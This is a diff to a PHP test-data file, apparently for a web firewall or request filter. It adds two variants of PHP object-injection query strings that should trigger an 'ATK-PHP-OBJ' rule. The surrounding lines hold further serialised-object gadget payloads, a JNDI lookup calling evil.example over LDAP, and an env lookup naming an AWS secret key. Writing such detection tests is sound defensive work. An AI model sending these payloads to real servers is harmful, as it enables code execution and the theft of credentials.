@@ -139,6 +139,8 @@ return [
             ['/?d=O:8:%22stdClass%22:0:%7B%7D', [], 'ATK-PHP-OBJ'],                       // a serialised object: unserialize() gadget chains
             ['/?d=O:%2B8:%22stdClass%22:0:%7B%7D', [], 'ATK-PHP-OBJ'],                    // the "+" PHP accepts too (sent as %2B: a bare + is a space)
             ['/?d=a:1:%7Bi:0;O:24:%22GuzzleHttp\\Psr7\\FnStream%22:1:%7Bs:1:%22x%22;i:1;%7D%7D', [], 'ATK-PHP-OBJ'],   // inside an array, namespaced
+            ['/?d=O:8:%22stdClass%22:%2B0:%7B%7D', [], 'ATK-PHP-OBJ'],                    // a sign on the count of properties: PHP takes it
+            ['/?d=O:8:%22stdClass%22:00001:%7B%7D', [], 'ATK-PHP-OBJ'],                   // leading zeros
             ['/?d=C:11:%22ArrayObject%22:21:%7Bx:i:0;a:0:%7B%7D;m:a:0:%7B%7D%7D', [], 'ATK-PHP-OBJ'],   // a custom-serialised one
             ['/?a=${env:AWS_SECRET_ACCESS_KEY}', [], 'ATK-JNDI'],
             ['/${jndi:ldap://evil.example/x}', [], 'ATK-JNDI'],
